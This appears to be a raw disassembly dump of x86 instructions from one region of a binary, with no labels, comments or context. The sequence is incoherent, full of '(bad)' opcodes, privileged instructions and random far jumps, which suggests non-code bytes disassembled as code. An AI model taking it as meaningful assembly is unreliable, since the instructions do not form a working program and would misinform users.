  42364f:	imul   ebp,DWORD PTR [edi+esi*4+0x65],0xffffffe1
  423654:	adc    dh,BYTE PTR [edx-0x5d]
  423657:	stc    
  423658:	sub    BYTE PTR ds:0xba6d75a2,dh
  42365e:	sub    cl,0xbe
  423661:	jno    0x42365c
  423663:	mov    al,ds:0x4d92ffd8
  423668:	and    DWORD PTR [ebx+0x4b893817],esp
  42366e:	stc    
  42366f:	or     DWORD PTR [ebp-0x1f],edx
  423672:	aas    
  423673:	jl     0x4236a4
  423675:	and    BYTE PTR [esi],cl
  423677:	or     al,0xef
  423679:	jecxz  0x423693
  42367b:	sbb    BYTE PTR [eax-0x4d],0xc5
  42367f:	mov    ds:0x194ff1cc,eax
  423684:	inc    esp
  423685:	jo     0x4236f3
  423687:	aam    0xe2
  423689:	(bad)  
  42368a:	lea    edx,[ebx+0x52]
  42368d:	pop    eax
  42368e:	fsub   DWORD PTR [edx+0x4adfe827]
  423694:	repnz mov bh,0x95
  423697:	das    
  423698:	icebp  
  423699:	push   DWORD PTR [edx+0x32]
  42369c:	cmc    
  42369d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42369e:	sub    esi,ecx
  4236a0:	ret    
  4236a1:	xor    eax,0xce355206
  4236a6:	imul   edx,DWORD PTR [edi+0x45b237c5],0x8f00757d
  4236b0:	and    eax,0x14cce7c9
  4236b5:	and    al,0x2b
  4236b7:	lods   al,BYTE PTR ds:[esi]
  4236b8:	mov    ds:0xd076248f,al
  4236bd:	push   esi
  4236be:	outs   dx,BYTE PTR ds:[esi]
  4236bf:	aaa    
  4236c0:	sahf   
  4236c1:	fwait
  4236c2:	add    ebp,ebx
  4236c4:	inc    esp
  4236c5:	fbstp  TBYTE PTR [ebx-0x5c07f051]
  4236cb:	ss mov ah,0x61
  4236ce:	mov    esp,0xc538b6b2
  4236d3:	test   al,0xe9
  4236d5:	outs   dx,BYTE PTR ds:[esi]
  4236d6:	pop    esp
  4236d7:	sbb    ebp,DWORD PTR [ecx+0x1f]
  4236da:	call   0x227b536b
  4236df:	fucomip st,st(3)
  4236e1:	fidivr DWORD PTR [ecx+0x4f]
  4236e4:	sldt   WORD PTR [eax]
	...
  4236ef:	add    BYTE PTR [eax],al
  4236f1:	sbb    al,0x66
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x41573650],dh
  423701:	inc    ebp
  423702:	scas   eax,DWORD PTR es:[edi]
  423703:	add    DWORD PTR [eax],eax
  423705:	lods   al,BYTE PTR ds:[esi]
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    al,al
  42370a:	leave  
  42370b:	mov    ah,0xb4
  42370d:	xor    cl,bh
  42370f:	mov    cl,0x37
  423711:	mov    ch,0x3a
  423713:	inc    esi
  423714:	jle    0x4236bd
  423716:	inc    ecx
  423717:	gs push esi
  423719:	mov    esi,0x351df5cf
  42371e:	jp     0x4236c7
  423720:	lea    ecx,[edx]
  423722:	dec    ebx
  423723:	(bad)  
  423724:	aas    
  423725:	rcl    DWORD PTR [ecx],0x1a
  423728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423729:	sbb    ah,BYTE PTR [ebx-0x65]
  42372c:	cmc    
  42372d:	pop    es
  42372e:	inc    ecx
  42372f:	mov    bl,0x22
  423731:	ins    DWORD PTR es:[edi],dx
  423732:	loopne 0x423781
  423734:	outs   dx,BYTE PTR ds:[esi]
  423735:	jmp    0xd62aff54
  42373a:	dec    esp
  42373b:	imul   esp,DWORD PTR es:[ebp+0x24],0xffffff87
  423740:	dec    esi
  423741:	scas   al,BYTE PTR es:[edi]
  423742:	push   ss
  423743:	into   
  423744:	sub    DWORD PTR [ebx],0xffffff9c
  423747:	into   
  423748:	pop    edx
  423749:	or     al,0x2f
  42374b:	and    al,0xac
  42374d:	(bad)  
  42374e:	shl    esi,1
  423750:	xchg   BYTE PTR [eax],dh
  423752:	xchg   ecx,eax
  423753:	mov    BYTE PTR [ecx-0xb],al
  423756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423757:	sahf   
  423758:	push   0xbee5ae3e
  42375d:	and    al,0x85
  42375f:	xchg   BYTE PTR gs:[eax+edi*4],ah
  423763:	fst    QWORD PTR ss:[eax+0xda7fd2a]
  42376a:	adc    cl,BYTE PTR [eax+0x70]
  42376d:	push   cs
  42376e:	jnp    0x4237d7
  423770:	in     eax,0xd8
  423772:	lahf   
  423773:	xor    al,0xd0
  423775:	loope  0x4236fd
  423777:	rcr    DWORD PTR [ebp+0x73],0xef
  42377b:	pop    edx
  42377c:	(bad)
  42377f:	xchg   DWORD PTR [ebp-0x3f],edi
  423782:	jae    0x423726
  423784:	jno    0x42371c
  423786:	out    0x82,eax
  423788:	xor    eax,0xf7682564
  42378d:	icebp  
  42378e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42378f:	outs   dx,DWORD PTR ds:[esi]
  423790:	jb     0x4237fb
  423792:	xchg   esi,eax
  423793:	push   ds
  423794:	inc    dh
  423796:	and    al,0x6
  423798:	push   es
  423799:	pop    esp
  42379a:	push   eax
  42379b:	sub    ch,BYTE PTR [ebp+0x40]
  42379e:	outs   dx,BYTE PTR ds:[esi]
  42379f:	pop    es
  4237a0:	scas   al,BYTE PTR es:[edi]
  4237a1:	inc    esi
  4237a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237a3:	jns    0x4237e0
  4237a5:	out    0x72,eax
  4237a7:	xchg   esi,eax
  4237a8:	fld    TBYTE PTR [eax+0x7352bf1e]
  4237ae:	scas   al,BYTE PTR es:[edi]
  4237af:	sbb    eax,DWORD PTR [edi+0x62034160]
  4237b5:	xor    al,0xda
  4237b7:	scas   eax,DWORD PTR es:[edi]
  4237b8:	mov    ebp,DWORD PTR [esi]
  4237ba:	cmp    dh,BYTE PTR [ecx]
  4237bc:	mov    esp,0x70da29b0
  4237c1:	pop    eax
  4237c2:	mov    WORD PTR [eax-0x55],cs
  4237c5:	jae    0x4237aa
  4237c7:	sbb    al,bh
  4237c9:	mov    ebp,0xd3039094
  4237ce:	xor    DWORD PTR [edi+eax*2+0x4f8c724c],edi
  4237d5:	mov    ch,0x24
  4237d7:	clc    
  4237d8:	fcmovbe st,st(6)
  4237da:	std    
  4237db:	nop
  4237dc:	out    dx,al
  4237dd:	data16 stc 
  4237df:	mov    ?,ebp
  4237e1:	into   
  4237e2:	rol    BYTE PTR [edi],cl
  4237e4:	pop    edx
  4237e5:	in     al,dx
  4237e6:	cmp    DWORD PTR [ebx+0x596479d4],edi
  4237ec:	inc    esp
  4237ed:	sbb    BYTE PTR [eax+eiz*1],bh
  4237f0:	ja     0x42378a
  4237f2:	stos   DWORD PTR es:[edi],eax
  4237f3:	sbb    eax,0x471c0c11
  4237f8:	xlat   BYTE PTR ds:[ebx]
  4237f9:	and    DWORD PTR [eax],ebx
  4237fb:	cwde   
  4237fc:	sbb    BYTE PTR [eax],dl
  4237fe:	(bad)  
  4237ff:	lahf   
  423800:	xchg   ecx,eax
  423801:	aas    
  423802:	mov    DWORD PTR [ebp-0x26ea4765],0xaf5e9af
  42380c:	ret    
  42380d:	adc    edx,esp
  42380f:	push   esi
  423810:	dec    edi
  423811:	add    eax,0xb38d6fa
  423816:	ss aaa 
  423818:	hlt    
  423819:	ret    0x304d
  42381c:	bound  ebp,QWORD PTR gs:[esi]
  42381f:	sbb    BYTE PTR [edx],dh
  423821:	(bad)  
  423822:	or     edi,DWORD PTR [esi-0x50]
  423825:	jg     0x547a93d0
  42382b:	mov    bl,dl
  42382d:	ds enter 0x11bf,0x77
  423832:	imul   edx,DWORD PTR [edi+0x67ce8442],0x43a8b8eb
  42383c:	jge    0x423899
  42383e:	or     al,0x13
  423840:	gs out 0x75,eax
  423843:	int    0x2d
  423845:	mov    ah,0x57
  423847:	xor    ah,bh
  423849:	mov    esi,0x1b7c34a8
  42384e:	rcr    eax,cl
  423850:	jmp    0x860b:0xfeec8e57
  423857:	push   0x34
  423859:	ror    BYTE PTR [ecx],1
  42385b:	into   
  42385c:	pop    ecx
  42385d:	pushf  
  42385e:	push   cs
  42385f:	mov    ds:0x56dbde8d,al
  423864:	js     0x423814
  423866:	stc    
  423867:	stos   BYTE PTR es:[edi],al
  423868:	dec    edx
  423869:	(bad)  
  42386a:	je     0x4238df
  42386c:	sti    
  42386d:	and    DWORD PTR ds:0xb2c2d32e,esp
  423873:	and    eax,DWORD PTR [ecx-0x4b]
  423876:	add    bh,0xbd
  423879:	loope  0x4238db
  42387b:	add    DWORD PTR [ebx],edi
  42387d:	mov    esp,0x33d06f89
  423882:	mov    ah,0x15
  423884:	jbe    0x4238ea
  423886:	mov    dl,0xc
  423888:	fsubr  QWORD PTR [eax+eax*4+0xa95fb90]
  42388f:	jge    0x423880
  423891:	mov    cl,0xef
  423893:	fisub  WORD PTR [ecx]
  423895:	mov    dh,BYTE PTR [edi-0x12aed86f]
  42389b:	stos   DWORD PTR es:[edi],eax
  42389c:	or     DWORD PTR [ebx+0x717bbbf1],edi
  4238a2:	stos   DWORD PTR es:[edi],eax
  4238a3:	pop    ebp
  4238a4:	jb     0x423907
  4238a6:	mov    bh,0xc1
  4238a8:	iret   
  4238a9:	repnz mov dh,0xb8
  4238ac:	lods   eax,DWORD PTR ds:[esi]
  4238ad:	jmp    0x4238c7
  4238af:	call   0xafa0:0xfc540415
  4238b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238b7:	add    al,0x7a
  4238b9:	pop    ebx
  4238ba:	ficom  DWORD PTR [ebx-0x28]
  4238bd:	stc    
  4238be:	out    dx,eax
  4238bf:	loop   0x42388f
  4238c1:	aam    0xd9
  4238c3:	lods   al,BYTE PTR ds:[esi]
  4238c4:	jecxz  0x4238f3
  4238c6:	out    0xaf,eax
  4238c8:	jae    0x42393c
  4238ca:	popa   
  4238cb:	ds in  al,0xb2
  4238ce:	jno    0x4238cc
  4238d0:	rcl    BYTE PTR [edi+ebp*2-0x64f65f67],0xdc
  4238d8:	popf   
  4238d9:	mov    bl,0xef
  4238db:	rdpmc  
  4238dd:	sbb    ah,BYTE PTR [ebx+edx*2+0x29]
  4238e1:	jecxz  0x42389d
  4238e3:	push   ss
  4238e4:	(bad)  
  4238e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238e6:	mov    bh,0x9b
  4238e8:	test   eax,0xd7d23bab
  4238ed:	test   al,0x95
  4238ef:	xchg   esi,eax
  4238f0:	lods   eax,DWORD PTR ds:[esi]
  4238f1:	cdq    
  4238f2:	mov    DWORD PTR [edx-0x318d7e50],ebx
  4238f8:	sub    cl,dh
  4238fa:	mov    esp,DWORD PTR [ebx-0x7548032c]
  423900:	cmp    dl,al
  423902:	sar    eax,0xe8
  423905:	rcl    DWORD PTR [eax],cl
  423907:	inc    ebx
  423908:	(bad)  
  423909:	push   DWORD PTR [si]
  42390c:	scas   al,BYTE PTR es:[edi]
  42390d:	icebp  
  42390e:	sub    BYTE PTR [ebp+0x6522ba3d],dh
  423914:	std    
  423915:	call   0x578c:0xb6a02537
  42391c:	lahf   
  42391d:	push   edi
  42391e:	cmp    esp,DWORD PTR [eax]
  423920:	pop    es
  423921:	pushf  
  423922:	sar    dh,1
  423924:	clc    
  423925:	loop   0x4238ec
  423927:	or     ah,bl
  423929:	and    BYTE PTR [edi+0x2ff9646b],bl
  42392f:	mov    WORD PTR ds:0x4be1998f,ss
  423935:	arpl   bx,dx
  423937:	push   edi
  423938:	and    al,0x40
  42393a:	jle    0x4238ef
  42393c:	cmp    DWORD PTR [edi-0x35],ebp
  42393f:	ss sbb edx,ebx
  423942:	(bad)  
  423943:	mov    ecx,0x6d7ec6cc
  423948:	jmp    0xd6ec:0xdac8ede
  42394f:	cmp    ebx,DWORD PTR [esi+0x66819d30]
  423955:	loope  0x423934
  423957:	div    DWORD PTR [edi+0xe]
  42395a:	or     bl,BYTE PTR [ecx-0x71]
  42395d:	ficom  WORD PTR [edi]
  42395f:	(bad)
  423963:	mov    bl,0xdf
  423965:	fldenv [ebx]
  423967:	jg     0x4239e1
  423969:	stc    
  42396a:	add    BYTE PTR [ebx-0x66a47368],cl
  423970:	sub    BYTE PTR [ecx],cl
  423972:	mov    ds:0x1c638dd4,eax
  423977:	mov    al,0x10
  423979:	mov    edi,0x691b162c
  42397e:	int3   
  42397f:	out    dx,al
  423980:	mov    ds:0x6cdd811c,eax
  423985:	or     eax,0x8b7b0295
  42398a:	inc    edi
  42398b:	push   ds
  42398c:	ret    0xbcc
  42398f:	sub    al,0xd8
  423991:	test   BYTE PTR [esi+0x24874fce],ch
  423997:	cmp    DWORD PTR [esi-0x6f5e700b],eax
  42399d:	mov    dh,0x6c
  42399f:	adc    eax,0xd36d5786
  4239a4:	shl    DWORD PTR [ecx+0x6dde58f3],0x7
  4239ab:	lahf   
  4239ac:	test   BYTE PTR [edx-0x3f],dl
  4239af:	xchg   esp,eax
  4239b0:	mov    bh,0xd6
  4239b2:	imul   esi
  4239b4:	and    eax,0xa6c2f960
  4239b9:	clc    
  4239ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239bb:	sbb    dh,BYTE PTR [esi+edi*1-0x35eeb561]
  4239c2:	push   ecx
  4239c3:	xchg   esi,eax
  4239c4:	sbb    DWORD PTR [edi-0x45733461],0xfffffff1
  4239cb:	pop    ecx
  4239cc:	pushf  
  4239cd:	and    DWORD PTR [edx-0x510f7dc0],0x59c54355
  4239d7:	imul   ebp,ecx,0x4d
  4239da:	fmul   DWORD PTR [ecx]
  4239dc:	dec    edx
  4239dd:	scas   eax,DWORD PTR es:[edi]
  4239de:	iret   
  4239df:	and    BYTE PTR [esi-0x70704554],bl
  4239e5:	loopne 0x423968
  4239e7:	xchg   DWORD PTR [ecx-0x34cbd8c3],esp
  4239ed:	or     eax,0xb8b05e64
  4239f2:	inc    edi
  4239f3:	push   ecx
  4239f4:	push   ebx
  4239f5:	hlt    
  4239f6:	cwde   
  4239f7:	imul   ebp,ebx,0x8
  4239fa:	mov    eax,0x1b31fe02
  4239ff:	sbb    BYTE PTR [ebx-0x62],ah
  423a02:	es inc eax
  423a04:	test   BYTE PTR [esi+0x41ecdfae],dl
  423a0a:	cmp    al,0xe1
  423a0c:	dec    edi
  423a0d:	loopne 0x4239fa
  423a0f:	xor    BYTE PTR [ecx+0x5545603b],dl
  423a15:	ror    BYTE PTR ds:0xa6ba4ef8,cl
  423a1b:	adc    dh,al
  423a1d:	cld    
  423a1e:	cmp    al,0xe7
  423a20:	in     eax,0xb8
  423a22:	test   eax,0x11a0f40b
  423a27:	mov    ds:0x480ec790,al
  423a2c:	jnp    0x423a62
  423a2e:	repz mov ebx,0x3c43fc2b
  423a34:	leave  
  423a35:	test   eax,0x469e51ab
  423a3a:	xchg   DWORD PTR [esi+0x2b839a12],esi
  423a40:	aad    0x80
  423a42:	lods   eax,DWORD PTR ds:[esi]
  423a43:	loope  0x4239dc
  423a45:	(bad)  
  423a46:	mov    ebx,0x84ef0818
  423a4b:	std    
  423a4c:	mov    ?,WORD PTR [ecx+0x2f1f47fa]
  423a52:	jp     0x423ac4
  423a54:	sub    al,0xa9
  423a56:	jecxz  0x423a98
  423a58:	repz sbb BYTE PTR [ecx],0x3a
  423a5c:	loop   0x423a4b
  423a5e:	mov    DWORD PTR [ebx-0x46],ebp
  423a61:	inc    edi
  423a62:	mov    ah,0xd1
  423a64:	pushf  
  423a65:	inc    ebp
  423a66:	adc    ch,BYTE PTR [edx+ebx*8]
  423a69:	mov    edi,DWORD PTR [edi]
  423a6b:	cmp    BYTE PTR [esi],bl
  423a6d:	cmp    eax,0x80181612
  423a72:	lods   eax,DWORD PTR ds:[esi]
  423a73:	jbe    0x423a71
  423a75:	mov    dh,0x8
  423a77:	icebp  
  423a78:	lods   eax,DWORD PTR ds:[esi]
  423a79:	adc    al,0x5d
  423a7b:	loope  0x423af5
  423a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a7e:	ficom  WORD PTR [ebp+0x35]
  423a81:	jmp    0x423ae4
  423a83:	mov    DWORD PTR [esi],edi
  423a85:	fisubr WORD PTR [esi]
  423a87:	cdq    
  423a88:	mov    ebp,0xb80f45b6
  423a8d:	sbb    dl,ah
  423a8f:	pop    edx
  423a90:	shr    esp,1
  423a92:	push   ds
  423a93:	push   cs
  423a94:	mov    edx,0xdea0fe64
  423a99:	xchg   BYTE PTR [eax-0x1b],ah
  423a9c:	in     eax,0x1c
  423a9e:	test   eax,0xd83e965
  423aa3:	(bad)  
  423aa4:	mov    cl,0xef
  423aa6:	sbb    al,0x27
  423aa8:	das    
  423aa9:	ins    DWORD PTR es:[edi],dx
  423aaa:	xor    DWORD PTR [ebx-0x25],ebx
  423aad:	or     al,0x22
  423aaf:	daa    
  423ab0:	push   0x7b
  423ab2:	xchg   edi,eax
  423ab3:	push   ebp
  423ab4:	loop   0x423ab6
	...
  423abe:	add    BYTE PTR [eax],al
  423ac0:	add    BYTE PTR [ecx-0x6],cl
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi+0x24],cs
  423ace:	sti    
  423acf:	mov    ds:0x1b2f1f9,al
  423ad4:	add    BYTE PTR [ebx+eax*1+0x47550000],ch
  423adb:	pop    ecx
  423adc:	xchg   ebp,eax
  423add:	cmp    BYTE PTR [esi],dh
  423adf:	adc    al,0x56
  423ae1:	xor    al,0xb1
  423ae3:	aam    0x37
  423ae5:	inc    esi
  423ae6:	int3   
  423ae7:	add    BYTE PTR [edi],ah
  423ae9:	arpl   si,cx
  423aeb:	fisttp WORD PTR [edi]
  423aed:	mov    al,0x75
  423aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423af0:	push   eax
  423af1:	mov    BYTE PTR [bp+di],cl
  423af4:	push   0x20
  423af6:	dec    esp
  423af7:	xchg   edx,eax
  423af8:	xor    al,BYTE PTR [edi+0x6e]
  423afb:	scas   al,BYTE PTR es:[edi]
  423afc:	mov    ecx,0x3c9c43d7
  423b01:	fs mov edx,0x79cc3f42
  423b07:	mov    dh,0x2b
  423b09:	jmp    0x75f16dc4
  423b0e:	repz and BYTE PTR [edi],0xed
  423b12:	add    al,0x65
  423b14:	icebp  
  423b15:	loop   0x423b00
  423b17:	dec    esp
  423b18:	in     al,0xd1
  423b1a:	push   0x6f08c95
  423b1f:	jns    0x423b7b
  423b21:	sub    eax,0x6a8d0745
  423b26:	sahf   
  423b27:	sbb    ebx,edx
  423b29:	xor    DWORD PTR gs:[ebx+esi*1+0x7347ce17],edx
  423b31:	fisub  DWORD PTR [esi+0x5e5032c1]
  423b37:	mov    ecx,0x8c27cd15
  423b3c:	test   eax,0x5215b968
  423b41:	push   edi
  423b42:	mov    ah,bh
  423b44:	mov    ss,WORD PTR [edi+0x61]
  423b47:	(bad)
  423b4b:	adc    al,0x6a
  423b4d:	xor    BYTE PTR [edi-0x52],ah
  423b50:	imul   edx,DWORD PTR [ecx],0xab1867d8
  423b56:	inc    edx
  423b57:	aam    0x9d
  423b59:	je     0x423af2
  423b5b:	sti    
  423b5c:	push   esp
  423b5d:	loop   0x423b06
  423b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b60:	cmovle eax,ebp
  423b63:	and    al,0x37
  423b65:	add    DWORD PTR [eax+ecx*8+0xbcb6466],edi
  423b6c:	call   0x716c1372
  423b71:	sbb    DWORD PTR [eax],0x1e
  423b74:	pop    ebp
  423b75:	int3   
  423b76:	mov    ch,BYTE PTR [ecx+0x15a76aad]
  423b7c:	loop   0x423b1b
  423b7e:	(bad)  
  423b7f:	nop
  423b80:	mov    al,ds:0xd0187d2
  423b85:	mov    eax,0xba2b43fd
  423b8a:	xchg   DWORD PTR [eax+0x1d],esi
  423b8d:	loopne 0x423b1a
  423b8f:	add    eax,0x197d7a77
  423b94:	cmc    
  423b95:	sbb    eax,0xe42024df
  423b9a:	in     al,dx
  423b9b:	leave  
  423b9c:	push   ecx
  423b9d:	sub    ah,BYTE PTR [edx+0x2316a365]
  423ba3:	aaa    
  423ba4:	out    dx,al
  423ba5:	push   esi
  423ba6:	or     ebx,DWORD PTR [eax+eiz*4-0x659b80ea]
  423bad:	test   BYTE PTR [ebp-0x13],ch
  423bb0:	div    DWORD PTR [ecx]
  423bb2:	mov    ds:0x801a77cb,eax
  423bb7:	ret    0x29ad
  423bba:	addr16 pop eax
  423bbc:	xlat   BYTE PTR ds:[ebx]
  423bbd:	sbb    ah,0x59
  423bc0:	into   
  423bc1:	inc    eax
  423bc2:	jle    0x423c0f
  423bc4:	test   BYTE PTR [eax-0x1323d0d8],0xd0
  423bcb:	in     eax,0x36
  423bcd:	arpl   WORD PTR [ebp+0x3b02c1f5],si
  423bd3:	xor    edx,ecx
  423bd5:	jae    0x423bf8
  423bd7:	jge    0x423c12
  423bd9:	bsf    edx,DWORD PTR [ebx+0x2fc27342]
  423be0:	test   eax,0x1c3a2d2f
  423be5:	jg     0x423bb0
  423be7:	das    
  423be8:	pop    ecx
  423be9:	lods   eax,DWORD PTR ds:[esi]
  423bea:	cmp    dh,bh
  423bec:	aaa    
  423bed:	pop    ecx
  423bee:	ret    0x4714
  423bf1:	cmp    DWORD PTR [edx],edi
  423bf3:	adc    dh,bl
  423bf5:	push   esp
  423bf6:	nop
  423bf7:	test   DWORD PTR [edx],ebx
  423bf9:	xlat   BYTE PTR ds:[ebx]
  423bfa:	xor    bh,BYTE PTR ds:0x33a76733
  423c00:	inc    esp
  423c01:	or     eax,0x10e4f493
  423c06:	das    
  423c07:	sub    al,0x20
  423c09:	inc    ecx
  423c0a:	or     BYTE PTR [ebx],cl
  423c0c:	sti    
  423c0d:	xchg   BYTE PTR [ebp+0x61f47eed],ch
  423c13:	sbb    eax,0xbe290d29
  423c18:	pop    ds
  423c19:	aam    0x9e
  423c1b:	push   ss
  423c1c:	dec    esp
  423c1d:	imul   ecx,DWORD PTR [eax],0xffffffa3
  423c20:	sub    BYTE PTR [edi],dh
  423c22:	adc    ch,BYTE PTR [eax]
  423c24:	retf   
  423c25:	test   al,0xc3
  423c27:	sub    ecx,DWORD PTR [edx+0x6ea52bcf]
  423c2d:	jmp    0x744d73d5
  423c32:	mov    dh,0x5f
  423c34:	inc    eax
  423c35:	add    DWORD PTR [edx+0x4d480946],ebx
  423c3b:	fs push esp
  423c3d:	call   0x47f7:0xa3d941b5
  423c44:	mov    ebp,0x1ca34f2e
  423c4a:	repz fldcw WORD PTR [edi]
  423c4d:	push   cs
  423c4e:	mov    bh,0xea
  423c50:	xchg   edi,eax
  423c51:	fsubr  DWORD PTR [edx]
  423c53:	(bad)  
  423c54:	clc    
  423c55:	fld    QWORD PTR [ebp+0x61]
  423c58:	cmc    
  423c59:	jp     0x423cbb
  423c5b:	jge    0x423c6f
  423c5d:	xchg   edx,eax
  423c5e:	sbb    dh,BYTE PTR [ecx+0x2]
  423c61:	test   eax,0x428f333e
  423c66:	xor    eax,0x4cbf022c
  423c6b:	jnp    0x423cdf
  423c6d:	in     eax,0xfe
  423c6f:	pop    esp
  423c70:	xchg   edi,eax
  423c71:	push   edi
  423c72:	out    dx,al
  423c73:	add    BYTE PTR [ebx+0xe176519],bh
  423c79:	mov    bh,0x33
  423c7b:	mov    BYTE PTR [ebp-0x1f3897d5],0x23
  423c82:	fucom  st(2)
  423c84:	add    eax,0x413bb6a0
  423c89:	xchg   ebp,eax
  423c8a:	cmovae ebx,DWORD PTR [eax-0x25]
  423c8e:	loope  0x423c5c
  423c90:	daa    
  423c91:	adc    BYTE PTR [ebx-0x27381549],cl
  423c97:	inc    esp
  423c98:	pop    edi
  423c99:	(bad)  
  423c9a:	mov    ch,BYTE PTR [esi+ebx*8+0x22ff3c6a]
  423ca1:	mov    ebx,ecx
  423ca3:	aam    0x58
  423ca5:	sbb    BYTE PTR [eax],bl
  423ca7:	mov    ?,WORD PTR [edx]
  423ca9:	rcl    DWORD PTR [edx+0x279efabe],0x93
  423cb0:	fadd   DWORD PTR [edi]
  423cb2:	fwait
  423cb3:	int    0x63
  423cb5:	jbe    0x423c46
  423cb7:	pop    esi
  423cb8:	mov    WORD PTR [ecx+0x39],es
  423cbb:	loopne 0x423d39
  423cbd:	loope  0x423c88
  423cbf:	mov    ah,0xb9
  423cc1:	outs   dx,DWORD PTR ds:[esi]
  423cc2:	int    0xf3
  423cc4:	jle    0x423cac
  423cc6:	add    al,0x47
  423cc8:	ds pop eax
  423cca:	enter  0x324b,0xa
  423cce:	pop    edx
  423ccf:	bound  edx,QWORD PTR [esi+0x5482cc2c]
  423cd5:	sub    al,0xdc
  423cd7:	(bad)  [ecx+0x44fffa13]
  423cdd:	add    BYTE PTR [edi-0x51],0x9c
  423ce1:	dec    esp
  423ce2:	pop    esi
  423ce3:	in     al,dx
  423ce4:	fnsave [di-0x72]
  423ce8:	push   esi
  423ce9:	or     al,0xb5
  423ceb:	add    al,0xd
  423ced:	hlt    
  423cee:	mov    eax,0xcd86061
  423cf3:	dec    ebp
  423cf4:	in     eax,0x3
  423cf6:	retf   0x4502
  423cf9:	fwait
  423cfa:	or     al,0x6c
  423cfc:	test   eax,0x893d8774
  423d01:	sub    bh,BYTE PTR [edi]
  423d03:	push   ds
  423d04:	push   eax
  423d05:	mov    ds:0x18658652,al
  423d0a:	sub    DWORD PTR [esi-0x2e5a63fd],esp
  423d10:	mov    esp,0xfb9c045d
  423d15:	add    dh,BYTE PTR [eax-0x792012a8]
  423d1b:	repz and esi,ebp
  423d1e:	and    dh,BYTE PTR [esi-0x5f250509]
  423d24:	sbb    BYTE PTR [edi],dl
  423d26:	add    cl,BYTE PTR [ebx+edx*8]
  423d29:	dec    ecx
  423d2a:	test   al,0xf3
  423d2c:	test   eax,0xe6f549b2
  423d31:	adc    al,0x87
  423d33:	mov    ah,0xd2
  423d35:	dec    edi
  423d36:	imul   edi,ebx,0xffffffe2
  423d39:	retf   
  423d3a:	sbb    dl,BYTE PTR [ebx-0x7]
  423d3d:	(bad)  
  423d3e:	jae    0x423da8
  423d40:	add    al,0x2f
  423d42:	xchg   ebp,eax
  423d43:	test   eax,0x2b4225df
  423d48:	shl    BYTE PTR [esp+edx*2-0x59],1
  423d4c:	(bad)  
  423d4d:	(bad)  [eax+0x70ec453a]
  423d53:	test   DWORD PTR [edx+0x48],esp
  423d56:	js     0x423d59
  423d58:	mov    ch,0xda
  423d5a:	(bad)  
  423d5b:	loope  0x423d13
  423d5d:	adc    al,0x7e
  423d5f:	mov    di,0x97ed
  423d63:	ins    DWORD PTR es:[edi],dx
  423d64:	inc    esp
  423d65:	dec    ebp
  423d66:	std    
  423d67:	mov    dl,0xb5
  423d69:	in     al,0x54
  423d6b:	push   cs
  423d6c:	in     eax,dx
  423d6d:	scas   al,BYTE PTR es:[edi]
  423d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d6f:	inc    eax
  423d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d71:	jg     0x423d0b
  423d73:	adc    esi,ebx
  423d75:	popf   
  423d76:	inc    ebx
  423d77:	ret    0xaaef
  423d7a:	push   esi
  423d7b:	sbb    al,0xb0
  423d7d:	repz dec ecx
  423d7f:	js     0x423d80
  423d81:	rcl    DWORD PTR [ebx],0x7f
  423d84:	lods   al,BYTE PTR ds:[esi]
  423d85:	add    al,0xfd
  423d87:	add    BYTE PTR [eax+0x1a632805],bh
  423d8d:	sub    eax,0xaf0ee808
  423d92:	push   edx
  423d93:	in     al,0x98
  423d95:	cdq    
  423d96:	jnp    0x423d1f
  423d98:	jmp    0x423d48
  423d9a:	sbb    BYTE PTR [ecx],cl
  423d9c:	sahf   
  423d9d:	jns    0x423dca
  423d9f:	and    dl,BYTE PTR [eax]
  423da1:	xchg   DWORD PTR [esi],ebp
  423da3:	xor    BYTE PTR [edi+0x79],ah
  423da6:	jne    0x423da4
  423da8:	(bad)  
  423da9:	cmp    DWORD PTR [edi],ebp
  423dab:	cmp    DWORD PTR [ecx],esp
  423dad:	cmp    DWORD PTR [edi],esp
  423daf:	mov    ch,BYTE PTR [ebx+0x38]
  423db2:	mov    al,ds:0xc4861646
  423db7:	inc    edi
  423db8:	popf   
  423db9:	jne    0x423d9f
  423dbb:	fdivr  st,st(2)
  423dbd:	jecxz  0x423d90
  423dbf:	xor    dh,dh
  423dc1:	ja     0x423d8e
  423dc3:	push   ecx
  423dc4:	or     edx,DWORD PTR [edx]
  423dc6:	mov    cs,WORD PTR [ebp+0x45]
  423dc9:	sbb    al,0x69
  423dcb:	or     edx,DWORD PTR [ecx+0x51b2ab63]
  423dd1:	sub    eax,0x7ceaf457
  423dd6:	ss jg  0x423daa
  423dd9:	pop    DWORD PTR [ecx]
  423ddb:	ror    DWORD PTR ds:0x55420c8f,0xe4
  423de2:	inc    ecx
  423de3:	shr    esp,cl
  423de5:	cmp    al,0xe9
  423de7:	xor    eax,0xcc892699
  423dec:	push   ebx
  423ded:	mov    ds:0xa95751f1,eax
  423df2:	add    eax,0xa58c8943
  423df7:	mov    ebp,0xca4e666
  423dfc:	and    al,0x7a
  423dfe:	lock je 0x1886efae
  423e05:	pop    esi
  423e06:	add    ch,cl
  423e08:	rol    BYTE PTR ds:0xf675dcf8,cl
  423e0e:	mov    ds:0x9ae64c08,al
  423e13:	mov    ebx,0xd86006f8
  423e18:	adc    cl,bl
  423e1a:	mov    eax,DWORD PTR [esi]
  423e1c:	xor    ch,BYTE PTR [edi-0x2e5b002b]
  423e22:	jnp    0x423e27
  423e24:	xchg   ebp,eax
